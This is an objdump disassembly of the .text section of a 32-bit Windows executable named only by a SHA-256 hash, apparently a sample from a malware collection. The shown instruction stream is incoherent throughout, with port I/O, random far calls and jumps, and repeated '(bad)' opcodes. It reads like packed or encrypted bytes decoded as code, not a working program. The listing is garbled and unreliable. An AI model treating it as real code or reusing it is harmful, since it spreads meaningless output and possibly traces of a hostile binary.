
0b5a920404fbf222e6bc191463a14cef8fbf340bafdebc2f127ef3b8d113d130.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	push   es
  411001:	jb     0x410fb8
  411003:	sahf   
  411004:	push   ebx
  411005:	inc    ebp
  411006:	mov    ebx,DWORD PTR [edx-0x68]
  411009:	sti    
  41100a:	cld    
  41100b:	out    0xad,al
  41100d:	xchg   BYTE PTR [edx],cl
  41100f:	jmp    0x410fb2
  411011:	out    dx,al
  411012:	add    ah,BYTE PTR [edx]
  411014:	add    BYTE PTR [edx-0x61a05257],ch
  41101a:	icebp  
  41101b:	dec    edx
  41101c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41101d:	push   0x4cc4b03b
  411022:	jnp    0x411029
  411024:	pop    ds
  411025:	outs   dx,DWORD PTR ds:[esi]
  411026:	adc    eax,0xe5f588b8
  41102b:	mov    dl,dh
  41102d:	mov    ds:0x125cbc7d,eax
  411032:	sbb    BYTE PTR [ecx+0xb],bl
  411035:	jae    0x410fd4
  411037:	cmp    esp,DWORD PTR [ebx-0x5c]
  41103a:	adc    dh,cl
  41103c:	loope  0x410feb
  41103e:	mov    ebp,0x1f386035
  411043:	cmp    esp,0xa33a3892
  411049:	pop    ecx
  41104a:	and    eax,0xdf38c167
  41104f:	sub    DWORD PTR [eax+0x32],0xffffff9b
  411053:	fstp   QWORD PTR [ecx-0x48]
  411056:	int3   
  411057:	out    dx,eax
  411058:	ficom  DWORD PTR ss:[edi-0xb]
  41105c:	jo     0x4110c0
  41105e:	test   al,0xab
  411060:	out    dx,eax
  411061:	xor    cl,dl
  411063:	scas   al,BYTE PTR es:[edi]
  411064:	retf   
  411065:	mov    eax,0x797cba5b
  41106a:	out    dx,eax
  41106b:	mov    eax,ds:0x68cfb2fd
  411070:	cmp    DWORD PTR [ecx+0x5d],ebp
  411073:	pop    eax
  411074:	pop    ebp
  411075:	in     eax,0x2c
  411077:	cmp    al,0xe5
  411079:	and    BYTE PTR [ebp+0x2571135f],bl
  41107f:	addr16 cli 
  411081:	test   eax,0x8b50dd2a
  411086:	xchg   ebx,eax
  411087:	fwait
  411088:	js     0x411098
  41108a:	rol    DWORD PTR [ebp+0x33fc156f],1
  411090:	add    al,0x91
  411092:	cli    
  411093:	cld    
  411094:	ret    0x109b
  411097:	pop    ecx
  411098:	jns    0x4110bd
  41109a:	adc    eax,0x3cf85003
  41109f:	cmp    DWORD PTR [eax],esi
  4110a1:	inc    ebp
  4110a2:	xchg   edi,eax
  4110a3:	ror    DWORD PTR [edi+0x65],0x56
  4110a7:	add    al,0xce
  4110a9:	jp     0x411060
  4110ab:	mov    edi,DWORD PTR [eax-0x6304f976]
  4110b1:	xor    al,0x3f
  4110b3:	fimul  DWORD PTR [edi-0x62]
  4110b6:	ficom  DWORD PTR [edx+0x11]
  4110b9:	in     eax,0x89
  4110bb:	mov    dh,dl
  4110bd:	hlt    
  4110be:	sub    BYTE PTR [ecx-0x6b9c4fb1],bl
  4110c4:	mov    ebx,0x2fd7465b
  4110c9:	cwde   
  4110ca:	scas   eax,DWORD PTR es:[edi]
  4110cb:	ins    BYTE PTR es:[edi],dx
  4110cc:	pop    edi
  4110cd:	rcl    DWORD PTR [edx],0x8
  4110d0:	aas    
  4110d1:	dec    eax
  4110d2:	cdq    
  4110d3:	pushf  
  4110d4:	adc    al,0xf5
  4110d6:	sbb    eax,0xf196081b
  4110db:	out    0x3d,al
  4110dd:	imul   ecx,eax,0xbcd49225
  4110e3:	mov    dl,0x8d
  4110e5:	gs ja  0x41113d
  4110e8:	push   0xa3e9d65a
  4110ed:	bnd jbe 0x411144
  4110f0:	not    DWORD PTR [ebx-0x6c]
  4110f3:	inc    eax
  4110f4:	inc    eax
  4110f5:	and    bl,BYTE PTR [ebx-0xa]
  4110f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110f9:	sbb    al,BYTE PTR [eax+eiz*1+0x512decee]
  411100:	ret    0x86a6
  411103:	inc    ebx
  411104:	cmp    BYTE PTR [edi],al
  411106:	add    esi,DWORD PTR [ebp+0x3a]
  411109:	add    ecx,DWORD PTR [edi+0x2e6f4494]
  41110f:	jecxz  0x411105
  411111:	add    ch,dl
  411113:	rcl    esi,cl
  411115:	fldenv [ebx]
  411117:	add    al,0x4f
  411119:	add    DWORD PTR [eax],eax
  41111b:	pop    ebx
  41111c:	pushf  
  41111d:	cmp    edx,DWORD PTR [edi+0x75]
  411120:	and    esp,DWORD PTR [eax]
  411122:	cmp    esp,DWORD PTR [eax-0x443b72f2]
  411128:	fst    QWORD PTR [esi]
  41112a:	and    eax,0x2b3e0136
  41112f:	test   al,0xe0
  411131:	imul   esi,DWORD PTR [ebp+0x3c1cdc5b],0xffffff93
  411138:	xchg   ebx,esi
  41113a:	push   ecx
  41113b:	lock cmp BYTE PTR [ecx-0x53],0x8c
  411140:	inc    ecx
  411141:	push   0x3f
  411143:	mov    es,WORD PTR [eax-0x577291c3]
  411149:	xchg   edx,eax
  41114a:	inc    edi
  41114b:	ret    0x752e
  41114e:	add    ecx,DWORD PTR [eax-0x3727a060]
  411154:	sbb    cl,BYTE PTR [ebx]
  411156:	retf   0x1761
  411159:	ret    0xfdad
  41115c:	xor    eax,0x5636110
  411161:	ins    DWORD PTR es:[edi],dx
  411162:	inc    esi
  411163:	push   cs
  411164:	jne    0x411126
  411166:	(bad)  
  411167:	outs   dx,DWORD PTR ds:[esi]
  411168:	jp     0x411176
  41116a:	dec    ebp
  41116b:	call   0xa2cd:0x200cf3
  411172:	test   DWORD PTR [ecx-0x5],edi
  411175:	hlt    
  411176:	sub    dh,0xa7
  411179:	pop    edx
  41117a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41117b:	mov    bl,0xb7
  41117d:	inc    esp
  41117e:	push   0xbd6cc80a
  411183:	mov    dh,0x2c
  411185:	sub    BYTE PTR [ecx+eax*1],al
  411188:	sar    DWORD PTR [eax-0x12725c7f],0x27
  41118f:	adc    eax,0x242ca011
  411194:	adc    eax,0x259b0169
  411199:	test   BYTE PTR ds:0x52d249d9,dh
  41119f:	pop    esp
  4111a0:	push   0x1bcd80b2
  4111a5:	mov    BYTE PTR [esi+0x303b27bf],al
  4111ab:	jmp    0xa023332b
  4111b0:	or     eax,0xf7e1712a
  4111b5:	xchg   BYTE PTR [edx-0x1b35fab8],dl
  4111bb:	sahf   
  4111bc:	mov    bh,0x72
  4111be:	imul   ebx,DWORD PTR [ebx+0x7bb9085],0xffffffab
  4111c5:	inc    edi
  4111c6:	out    dx,al
  4111c7:	pop    edx
  4111c8:	mov    bh,al
  4111ca:	adc    eax,0x2a616
  4111cf:	scas   eax,DWORD PTR es:[edi]
  4111d0:	xchg   DWORD PTR [esi+edx*8],edi
  4111d3:	mov    eax,ds:0x36b64e01
  4111d8:	dec    ebx
  4111d9:	scas   eax,DWORD PTR es:[edi]
  4111da:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4111dc:	adc    al,0x69
  4111de:	add    bh,bh
  4111e0:	push   0xfffffff6
  4111e2:	inc    esp
  4111e3:	cmp    eax,0x2fe9a77a
  4111e8:	out    dx,eax
  4111e9:	xor    BYTE PTR [eax-0x31b56232],cl
  4111ef:	cwde   
  4111f0:	jp     0x41118b
  4111f2:	nop
  4111f3:	and    DWORD PTR [ebp-0x6a],edx
  4111f6:	imul   esp,DWORD PTR [ecx],0x7
  4111f9:	jb     0x4111ce
  4111fb:	mov    cl,0x7e
  4111fd:	push   0xffffff83
  4111ff:	fwait
  411200:	(bad)
  411203:	mov    edi,0x6bdfb0c0
  411208:	ficomp WORD PTR ds:0x5373c6bf
  41120e:	mov    bh,0x7
  411210:	xor    al,0x1a
  411212:	(bad)  [ecx+0x18a1129e]
  411218:	fiadd  WORD PTR [bp+si-0x59]
  41121c:	lock pop esp
  41121e:	les    edx,FWORD PTR [eax-0x2]
  411221:	mov    ebp,0x9e40dd15
  411226:	add    eax,DWORD PTR [edi+edx*1]
  411229:	cld    
  41122a:	sbb    esp,DWORD PTR [edi+0x46]
  41122d:	cmp    eax,0xdc9caeb6
  411232:	clc    
  411233:	dec    eax
  411234:	adc    DWORD PTR [edi],ecx
  411236:	mov    ebx,0x8a3cd325
  41123b:	sub    eax,0xe2d8c76d
  411240:	cmp    ch,BYTE PTR [edx]
  411242:	dec    ebp
  411243:	bound  ebx,QWORD PTR [esi+esi*4+0x49]
  411247:	call   0x7c1bebbd
  41124c:	push   edi
  41124d:	inc    eax
  41124e:	lea    edi,[edi-0xf]
  411251:	xlat   BYTE PTR ds:[ebx]
  411252:	loope  0x41124c
  411254:	or     dl,BYTE PTR [ebp-0x96e152f]
  41125a:	and    bh,BYTE PTR [edx]
  41125c:	call   0x4a86efb9
  411261:	js     0x411272
  411263:	dec    ecx
  411264:	push   ebp
  411265:	mov    edi,0x61d00b67
  41126a:	scas   al,BYTE PTR es:[edi]
  41126b:	cwde   
  41126c:	test   BYTE PTR [edi-0x2784128d],al
  411272:	jae    0x41123f
  411274:	push   cs
  411275:	and    al,0x20
  411277:	sar    ah,0x84
  41127a:	je     0x411254
  41127c:	or     al,0xbd
  41127e:	jg     0x41120e
  411280:	inc    ecx
  411281:	jbe    0x4112ec
  411283:	or     DWORD PTR [edi+0x37],0xa6450fac
  41128a:	ins    DWORD PTR es:[edi],dx
  41128b:	push   edx
  41128c:	jbe    0x411268
  41128e:	dec    edx
  41128f:	retf   0xfa23
  411292:	inc    esp
  411293:	js     0x4112e8
  411295:	out    0x31,eax
  411297:	cmp    al,0xc8
  411299:	jecxz  0x41122e
  41129b:	and    eax,0xe30496cc
  4112a0:	or     esi,DWORD PTR [eax]
  4112a2:	aaa    
  4112a3:	lods   al,BYTE PTR ds:[esi]
  4112a4:	les    esp,FWORD PTR [ebx+ecx*1]
  4112a7:	mov    eax,0x1b22b3b4
  4112ac:	inc    esi
  4112ad:	xor    eax,DWORD PTR [eax+ebp*4-0x14]
  4112b1:	and    al,0x18
  4112b3:	rol    BYTE PTR [eax-0xd],1
  4112b6:	push   0xffffffdf
  4112b8:	ins    DWORD PTR es:[edi],dx
  4112b9:	dec    ecx
  4112ba:	fcmovne st,st(3)
  4112bc:	adc    DWORD PTR [edi],eax
  4112be:	pop    es
  4112bf:	fistp  WORD PTR [edi+0x5db6d2dd]
  4112c5:	imul   eax,DWORD PTR [ebp+0x448f6d93],0x30
  4112cc:	add    BYTE PTR [ecx+edx*1],ch
  4112cf:	and    DWORD PTR [esi],edi
  4112d1:	mov    al,ds:0x3fae64a8
  4112d6:	jae    0x41132c
  4112d8:	aad    0x30
  4112da:	mov    eax,ds:0xac3a1a4d
  4112df:	in     al,dx
  4112e0:	lods   al,BYTE PTR ds:[esi]
  4112e1:	pop    esp
  4112e2:	lods   al,BYTE PTR ds:[esi]
  4112e3:	cmp    edx,eax
  4112e5:	add    ah,BYTE PTR [eax-0x4c]
  4112e8:	jae    0x41134d
  4112ea:	mov    esp,0x56ee0856
  4112ef:	dec    ebp
  4112f0:	sar    BYTE PTR [esi],1
  4112f2:	adc    bl,bl
  4112f4:	lock push cs
  4112f6:	cmp    eax,0x532bfaaa
  4112fb:	push   esi
  4112fc:	not    BYTE PTR [edx+0x6fb96834]
  411302:	arpl   WORD PTR [ebx+0xf],bp
  411305:	(bad)  
  411306:	(bad)  
  411307:	(bad)  
  411309:	cmp    bh,BYTE PTR [eax]
  41130b:	lods   eax,DWORD PTR ds:[esi]
  41130c:	sbb    eax,0x3fecbb6b
  411311:	out    dx,eax
  411312:	dec    ebx
  411313:	call   0x4991:0x726dbdd2
  41131a:	add    DWORD PTR [esi],edx
  41131c:	fadd   DWORD PTR [esi+0x6d]
  41131f:	loop   0x41135c
  411321:	inc    edi
  411322:	xlat   BYTE PTR ds:[ebx]
  411323:	sar    dh,1
  411325:	sahf   
  411326:	add    al,0xc2
  411328:	(bad)  [ebx+0x4b]
  41132b:	(bad)  
  41132c:	xchg   ebp,eax
  41132d:	shl    BYTE PTR [eax+0x60daa8e3],0xa5
  411334:	cmc    
  411335:	jle    0x41135b
  411337:	mov    al,0xea
  411339:	stos   BYTE PTR es:[edi],al
  41133a:	mov    ah,0x88
  41133c:	cmp    eax,0x9e463212
  411341:	imul   esi,DWORD PTR [ebx-0x18],0xcd2f7fdb
  411348:	push   es
  411349:	ror    dl,0xc
  41134c:	lods   eax,DWORD PTR ds:[esi]
  41134d:	call   0xcc7f3dfc
  411352:	iret   
  411353:	dec    ebx
  411354:	iret   
  411355:	repnz dec eax
  411357:	mov    ah,0x3e
  411359:	mov    edi,0x5f3030d0
  41135e:	cmp    ah,BYTE PTR [ebx+0x6d575aff]
  411364:	sbb    cl,al
  411366:	cli    
  411367:	in     eax,dx
  411368:	cmp    BYTE PTR [ebx-0x5b],bh
  41136b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41136c:	jo     0x4113af
  41136e:	aaa    
  41136f:	sbb    edx,DWORD PTR [esi+0x24]
  411372:	jns    0x411353
  411374:	xor    eax,0x4cfab174
  411379:	or     ebx,0x17
  41137c:	icebp  
  41137d:	lods   eax,DWORD PTR ds:[esi]
  41137e:	or     bh,bh
  411380:	pop    es
  411381:	xor    eax,0x40172bb5
  411386:	outs   dx,BYTE PTR ds:[esi]
  411387:	fsub   QWORD PTR [edi+0x4b331a59]
  41138d:	cmp    BYTE PTR [eax+eiz*1+0x60b2c49d],cl
  411394:	pop    ebx
  411395:	(bad)  
  411396:	mov    ds:0x357f8dc,eax
  41139b:	push   ebx
  41139c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41139d:	xchg   ecx,eax
  41139e:	sahf   
  41139f:	ins    DWORD PTR es:[edi],dx
  4113a0:	mov    esp,eax
  4113a2:	nop
  4113a3:	add    edx,DWORD PTR [edx]
  4113a5:	dec    esp
  4113a6:	dec    ebx
  4113a7:	cmc    
  4113a8:	inc    eax
  4113a9:	lods   eax,DWORD PTR ds:[esi]
  4113aa:	push   0x1d
  4113ac:	jne    0x411363
  4113ae:	add    bl,BYTE PTR [eax-0x24]
  4113b1:	in     al,0x27
  4113b3:	jg     0x4113da
  4113b5:	mov    WORD PTR [eax-0x211a43de],?
  4113bb:	jp     0x4113c0
  4113bd:	jne    0x4113c3
  4113bf:	and    dh,al
  4113c1:	mov    ebx,0x1a804c8d
  4113c6:	ret    0xccdf
  4113c9:	mov    ch,BYTE PTR [eax+0x5b8c23ba]
  4113cf:	mov    ds:0x5798be5c,al
  4113d4:	mov    ebx,0x680299cb
  4113d9:	ret    
  4113da:	add    DWORD PTR [esi+eiz*2+0x56ce8734],esp
  4113e1:	gs or  eax,0x38ceae2b
  4113e7:	xor    al,BYTE PTR [esi+ecx*2+0x58]
  4113eb:	je     0x4113bd
  4113ed:	icebp  
  4113ee:	pop    esp
  4113ef:	pop    edx
  4113f0:	xor    BYTE PTR [eax+ebp*8-0x6066e01a],dh
  4113f7:	popf   
  4113f8:	push   es
  4113f9:	pop    ebx
  4113fa:	repz inc esi
  4113fc:	mov    ah,0x57
  4113fe:	mov    es,ecx
  411400:	jp     0x41145b
  411402:	pop    ebx
  411403:	xchg   esi,eax
  411404:	sbb    BYTE PTR [ecx],0x9b
  411407:	icebp  
  411408:	push   cs
  411409:	sub    DWORD PTR [eax-0x5fd9ea89],esi
  41140f:	(bad)  
  411410:	sub    esi,DWORD PTR [edi+0x58]
  411413:	pop    edi
  411414:	ins    BYTE PTR es:[edi],dx
  411415:	mov    fs,edi
  411417:	int3   
  411418:	stos   DWORD PTR es:[edi],eax
  411419:	adc    al,0x17
  41141b:	xchg   ecx,eax
  41141c:	in     al,dx
  41141d:	outs   dx,BYTE PTR ds:[esi]
  41141e:	pop    edx
  41141f:	and    dh,ah
  411421:	es imul ecx,DWORD PTR cs:[ecx],0xffffff85
  411426:	sub    dh,BYTE PTR [esi-0x74]
  411429:	add    dl,BYTE PTR [esi]
  41142b:	xchg   edx,eax
  41142c:	or     ch,BYTE PTR [ebx-0x19]
  41142f:	bound  esi,QWORD PTR [ecx-0x51]
  411432:	fwait
  411433:	mov    eax,0x2f57580a
  411438:	mov    ds:0x23bf9e01,eax
  41143d:	dec    edx
  41143e:	cdq    
  41143f:	jle    0x4113cd
  411441:	mov    dl,0x99
  411443:	pop    ss
  411444:	dec    esp
  411445:	pop    eax
  411446:	pop    edi
  411447:	push   edx
  411448:	scas   eax,DWORD PTR es:[edi]
  411449:	cmp    edx,DWORD PTR [ebx]
  41144b:	cdq    
  41144c:	ja     0x411449
  41144e:	test   DWORD PTR [ebx+ebx*1-0x788e7975],ebx
  411455:	pop    ebp
  411456:	call   0x78dd:0xf96264cb
  41145d:	aad    0xa7
  41145f:	pop    edx
  411460:	xchg   ebp,eax
  411461:	sub    ah,dl
  411463:	sub    dh,BYTE PTR [ebp+0x7c]
  411466:	mov    edi,0x3ed89511
  41146b:	mov    esp,?
  41146d:	add    al,0x40
  41146f:	push   esi
  411470:	mov    eax,ds:0x43fd38b4
  411475:	adc    edi,esi
  411477:	imul   eax,ebx,0x603290a
  41147d:	add    edx,DWORD PTR [esi-0x50]
  411480:	jle    0x41148b
  411482:	inc    ecx
  411483:	imul   BYTE PTR [ecx+0x5a3ea884]
  411489:	xchg   esp,eax
  41148a:	inc    esi
  41148b:	test   eax,0xa3c05680
  411490:	nop
  411491:	arpl   WORD PTR [esi-0x3f],dx
  411494:	scas   al,BYTE PTR es:[edi]
  411495:	add    al,0xf2
  411497:	jge    0x411488
  411499:	xchg   edx,eax
  41149a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41149b:	aam    0x82
  41149d:	mul    edx
  41149f:	jl     0x411437
  4114a1:	jle    0x4114ca
  4114a3:	mov    edi,0x61601be7
  4114a8:	pusha  
  4114a9:	mov    ds:0x9bd4fb16,eax
  4114ae:	xchg   ecx,eax
  4114af:	adc    ch,0x9
  4114b2:	xchg   ebx,eax
  4114b3:	pop    ebx
  4114b4:	jl     0x4114af
  4114b6:	loope  0x4114ca
  4114b8:	xchg   ebp,eax
  4114b9:	lea    ecx,[edx+0x70fff7bf]
  4114bf:	cmp    DWORD PTR [ebx],eax
  4114c1:	mov    cl,BYTE PTR [esi+0xbd1e46d]
  4114c7:	(bad)  
  4114c8:	pushf  
  4114c9:	add    bh,ch
  4114cb:	mov    ds:0x6c1990e7,eax
  4114d0:	adc    dh,bl
  4114d2:	outs   dx,DWORD PTR ds:[esi]
  4114d3:	push   edx
  4114d4:	(bad)  
  4114d5:	mov    al,0xb9
  4114d7:	(bad)  
  4114d8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114da:	sbb    ebx,edx
  4114dc:	and    DWORD PTR [ecx],esi
  4114de:	mov    BYTE PTR [edx+0xf],bh
  4114e1:	dec    edx
  4114e2:	push   ecx
  4114e3:	popf   
  4114e4:	call   0xc740d055
  4114e9:	mov    al,ds:0xf6b430d7
  4114ee:	add    bh,BYTE PTR [edi+0x23]
  4114f1:	sub    BYTE PTR [ebx+0x7b],ch
  4114f4:	pop    ebp
  4114f5:	sbb    ah,al
  4114f7:	mov    DWORD PTR [ebx+0xe9b6021],esi
  4114fd:	pop    edx
  4114fe:	(bad)  
  4114ff:	pop    edi
  411500:	mov    edx,0xe8277a72
  411505:	dec    ebx
  411506:	xchg   ebx,eax
  411507:	or     eax,0x9fd681a0
  41150c:	cmp    ebp,DWORD PTR [esi-0x31bc493e]
  411512:	xchg   ebx,eax
  411513:	out    0x27,eax
  411515:	adc    ch,BYTE PTR [bx]
  411518:	jp     0x41154c
  41151a:	sbb    eax,0xbfea0c48
  41151f:	or     eax,ebx
  411521:	mov    ds:0x2abc4a2,al
  411526:	cmp    al,0x3b
  411528:	dec    edi
  41152a:	and    al,BYTE PTR [eax-0x52]
  41152d:	outs   dx,BYTE PTR ds:[esi]
  41152e:	mov    esp,0x34626eb5
  411533:	nop
  411534:	adc    dh,BYTE PTR [edi-0x6e]
  411537:	dec    ecx
  411538:	fistp  QWORD PTR [ebp-0x5f434fcd]
  41153e:	out    dx,eax
  41153f:	and    al,0xcb
  411541:	popf   
  411542:	lods   al,BYTE PTR ds:[esi]
  411543:	loop   0x4114cc
  411545:	inc    esi
  411546:	xchg   ecx,eax
  411547:	add    eax,0x5162d846
  41154c:	jno    0x4115ad
  41154e:	adc    dl,0x8d
  411551:	jns    0x4115cc
  411553:	je     0x4115d2
  411555:	arpl   WORD PTR [esi-0x3ef4148b],bx
  41155b:	repnz mov al,ds:0xba922619
  411561:	int    0xac
  411563:	sub    eax,0x12a3df0e
  411568:	mov    edx,0x1f1be837
  41156d:	out    0xcb,al
  41156f:	mov    ah,0x8e
  411571:	mov    ds:0x72d608c7,eax
  411576:	sub    bh,BYTE PTR [ecx]
  411578:	daa    
  411579:	out    dx,eax
  41157a:	lock dec ebx
  41157c:	imul   DWORD PTR ds:0xa67c4132
  411582:	dec    ebx
  411583:	test   al,0xeb
  411585:	pusha  
  411586:	jmp    FWORD PTR [eax+ebp*2-0x211f2e7b]
  41158d:	adc    eax,0xc720b40b
  411592:	loop   0x4115bc
  411594:	xor    eax,0xce371554
  411599:	push   0x14
  41159b:	fwait
  41159c:	and    edx,ebp
  41159e:	jmp    0x16089aa1
  4115a3:	jl     0x411532
  4115a5:	je     0x4115e0
  4115a7:	or     bl,BYTE PTR [eax+0x2]
  4115aa:	or     ebx,DWORD PTR [edi+0x25e42b97]
  4115b0:	stos   DWORD PTR es:[edi],eax
  4115b1:	popf   
  4115b2:	stos   BYTE PTR es:[edi],al
  4115b3:	mov    edx,0x7ae0d766
  4115b8:	shl    BYTE PTR [eax-0x18ce878f],cl
  4115be:	xor    BYTE PTR [esi+0x3678241c],cl
  4115c4:	or     eax,0xc8ca97d7
  4115c9:	cmp    BYTE PTR [ebx],dl
  4115cb:	xchg   ecx,eax
  4115cc:	mov    ds:0xcdf3f6f4,al
  4115d1:	jne    0x411602
  4115d3:	cwde   
  4115d4:	cmc    
  4115d5:	push   cs
  4115d6:	aad    0x9e
  4115d8:	lods   al,BYTE PTR ds:[esi]
  4115d9:	xor    BYTE PTR [esi+0x704aec49],bl
  4115df:	pop    ecx
  4115e0:	nop
  4115e1:	add    al,0xc2
  4115e3:	sbb    al,0x86
  4115e5:	xchg   DWORD PTR [eax+0x6dfe877a],esi
  4115eb:	mov    ebx,0xbcf091a3
  4115f0:	(bad)  
  4115f1:	cmp    DWORD PTR [ebp-0x5dff0ab5],edx
  4115f7:	mov    BYTE PTR [ecx],dl
  4115f9:	lds    edx,FWORD PTR [esi+0x52]
  4115fc:	xor    DWORD PTR [eax],ebp
  4115fe:	push   ebp
  4115ff:	shl    BYTE PTR [edi-0x167ce947],1
  411605:	mov    dh,0x80
  411607:	jle    0x41165d
  411609:	mov    eax,0xa5a81be7
  41160e:	pop    esp
  41160f:	mov    ebp,0x4af02a46
  411614:	shl    DWORD PTR [edi+0xa0987d0],0x69
  41161b:	pop    ecx
  41161c:	cmp    ebp,0x87a28b13
  411622:	mov    eax,ds:0xd97a7dbc
  411627:	dec    DWORD PTR [ebp-0x16]
  41162a:	imul   esi
  41162c:	and    al,0xee
  41162e:	push   ebp
  41162f:	or     eax,0x9e321602
  411634:	add    bh,BYTE PTR [esi]
  411636:	add    dh,BYTE PTR [edx]
  411638:	repz add BYTE PTR [ebx-0x3a],ch
  41163c:	add    ecx,DWORD PTR [ebp+0x77]
  41163f:	inc    ebx
  411640:	mov    edx,0x7202f1b4
  411645:	addr16 jae 0x4116b3
  411648:	addr16 popf 
  41164a:	mov    cl,BYTE PTR [ebx+0x59cba40f]
  411650:	push   0x785efb72
  411655:	test   ch,bh
  411657:	pop    edi
  411658:	jns    0x411666
  41165a:	call   0x8c45:0x22a6df63
  411661:	jmp    0x761a:0xcc52783c
  411668:	inc    ecx
  411669:	ja     0x4116e5
  41166b:	daa    
  41166c:	sar    BYTE PTR [ebp-0x6a760016],0x63
  411673:	shr    BYTE PTR [ebp+0x3c0a02e4],1
  411679:	xchg   edi,eax
  41167a:	and    eax,0x38b8d449
  41167f:	mov    edx,0xc7acefa1
  411684:	mov    eax,ds:0xef5ec145
  411689:	xor    al,0x5c
  41168b:	bound  esi,QWORD PTR [ebx-0x1]
  41168e:	jbe    0x4116ce
  411690:	xchg   ecx,eax
  411691:	adc    eax,0x5b357592
  411696:	dec    edx
  411697:	jg     0x4116f1
  411699:	sbb    BYTE PTR [ecx+0x43218588],bh
  41169f:	ret    
  4116a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116a1:	and    al,0x4c
  4116a3:	nop
  4116a4:	sahf   
  4116a5:	pop    ebx
  4116a6:	mov    esi,0x562af2a2
  4116ab:	pop    ss
  4116ac:	cs inc eax
  4116ae:	loope  0x41167e
  4116b0:	stos   BYTE PTR es:[edi],al
  4116b1:	xchg   BYTE PTR [ecx],ch
  4116b3:	xchg   edi,eax
  4116b4:	aas    
  4116b5:	(bad)  
  4116b6:	in     al,dx
  4116b7:	daa    
  4116b8:	cmp    DWORD PTR [edx],eax
  4116ba:	cmp    BYTE PTR [edx],dl
  4116bc:	mov    ds:0x172912bc,al
  4116c1:	jmp    0x41165f
  4116c3:	push   cs
  4116c4:	(bad)  
  4116c5:	clc    
  4116c6:	repnz hlt 
  4116c8:	neg    DWORD PTR [edi]
  4116ca:	mov    dl,0xde
  4116cc:	bound  eax,QWORD PTR ds:0xa395ef5d
  4116d2:	aaa    
  4116d3:	mov    ebp,0x93f640d7
  4116d8:	int    0x17
  4116da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116db:	das    
  4116dc:	fdivrp st(0),st
  4116de:	repnz stos DWORD PTR es:[edi],eax
  4116e0:	les    esp,FWORD PTR [edi]
  4116e2:	jbe    0x41171b
  4116e4:	jb     0x41175f
  4116e6:	or     BYTE PTR [edi+edi*8+0x4817e098],dh
  4116ed:	pushf  
  4116ee:	out    0xa4,al
  4116f0:	repz arpl WORD PTR [ecx+0x7e],bx
  4116f4:	(bad)  
  4116f5:	mov    bl,0xba
  4116f7:	call   0x2312ec62
  4116fc:	(bad)  
  4116fd:	pusha  
  4116fe:	jl     0x4116fb
  411700:	imul   esi,DWORD PTR [eax-0x18abd1c9],0x32
  411707:	adc    DWORD PTR ds:0x571bc673,0x15
  41170e:	ror    DWORD PTR [ebp+edx*1+0x1a246220],1
  411715:	xchg   esi,eax
  411716:	mov    edx,0xdf62651d
  41171b:	inc    esp
  41171c:	jle    0x41171d
  41171e:	adc    BYTE PTR [ebp-0x79b19f00],cl
  411724:	ins    BYTE PTR es:[edi],dx
  411725:	int3   
  411726:	sub    esp,DWORD PTR [ecx+ebp*1+0x7bafbc43]
  41172d:	ins    DWORD PTR es:[edi],dx
  41172e:	test   BYTE PTR [eax-0x55],bl
  411731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411732:	xchg   edi,eax
  411733:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411734:	xor    edx,DWORD PTR [eax]
  411736:	je     0x4116e3
  411738:	sti    
  411739:	sub    edx,ecx
  41173b:	in     al,dx
  41173c:	lods   al,BYTE PTR ds:[esi]
  41173d:	xor    edi,DWORD PTR [ecx]
  41173f:	fsubr  DWORD PTR [esi+0x2e]
  411742:	or     al,0x27
  411744:	sbb    DWORD PTR [edx],edi
  411746:	push   ecx
  411747:	pushf  
  411748:	push   es
  411749:	dec    ebp
  41174a:	push   0x55
  41174c:	cmp    ecx,esp
  41174e:	xchg   esp,edi
  411750:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411752:	xchg   BYTE PTR [ebx-0xb],dh
  411755:	mov    edx,0xb570e992
  41175a:	mov    ebx,?
  41175c:	mov    ebx,0x48b2e01e
  411761:	cli    
  411762:	test   BYTE PTR [edi],bl
  411764:	or     al,0x85
  411766:	gs pop ebx
  411768:	or     ch,BYTE PTR [esi]
  41176a:	pushf  
  41176b:	je     0x411708
  41176d:	int3   
  41176e:	inc    ebx
  41176f:	rol    DWORD PTR [eax+0x2c],cl
  411772:	and    edx,DWORD PTR [edi+0x75]
  411775:	js     0x4117c1
  411777:	out    0xd6,al
  411779:	jo     0x411793
  41177b:	shr    BYTE PTR [ebx-0x2d],0xd7
  41177f:	ins    DWORD PTR es:[edi],dx
  411780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411781:	jmp    FWORD PTR [ebp+0xcf04fca]
  411787:	jnp    0x41172f
  411789:	cwde   
  41178a:	jle    0x41180a
  41178c:	aad    0x1a
  41178e:	pushf  
  41178f:	mov    edi,0xaedd27dd
  411794:	in     al,dx
  411795:	xchg   edx,eax
  411796:	(bad)  
  411797:	mov    al,0xc
  411799:	in     al,dx
  41179a:	mov    al,ds:0xcb1116c9
  41179f:	das    
  4117a0:	repnz xor eax,0x2b6d8a8a
  4117a6:	in     al,0xf9
  4117a8:	jmp    0xaf194827
  4117ad:	xchg   edi,eax
  4117ae:	fnstenv [ecx-0x75]
  4117b1:	test   al,0x16
  4117b3:	add    esp,esi
  4117b5:	mov    dh,0x24
  4117b7:	mov    ah,0xbf
  4117b9:	(bad)  
  4117ba:	cmc    
  4117bb:	addr16 pop ebp
  4117bd:	test   al,0x67
  4117bf:	xchg   edx,eax
  4117c0:	xor    eax,0xdcb82ef5
  4117c5:	mov    esi,DWORD PTR [ebx]
  4117c7:	test   eax,0x8e28af5d
  4117cc:	(bad)  
  4117cd:	call   0x65b9:0xd92e79fa
  4117d4:	xchg   edx,eax
  4117d5:	mov    ds:0xa68028f7,al
  4117da:	cmp    BYTE PTR [eax+0x39],bh
  4117dd:	adc    cl,BYTE PTR [ecx]
  4117df:	clc    
